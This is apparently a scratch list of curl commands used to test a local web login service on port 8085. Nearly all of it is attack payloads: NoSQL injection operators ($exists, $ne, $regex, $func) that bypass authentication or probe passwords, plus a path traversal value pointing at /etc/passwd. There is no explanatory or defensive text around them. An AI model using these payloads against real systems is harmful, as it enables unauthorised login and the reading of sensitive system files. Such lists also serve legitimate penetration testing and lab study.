



curl -d username[$exists]=true&password[$exists]=true -XPOST localhost:8085



curl -d username=admin&password=admin -XPOST localhost:8085

username[$exists]=true&password[$exists]=true


curl -d "username[$ne]=toto&password[$ne]=toto" -X POST localhost:8085


curl -d "username[$ne]=toto&password[$regex]=a.{2}" -X POST localhost:8085



curl -d "username="{$func": "var_dump"}&password=" -XPOST localhost:8085


curl -d ""user":{"$func": "var_dump"}" -X POST localhost:8085

file=../../etc/passwd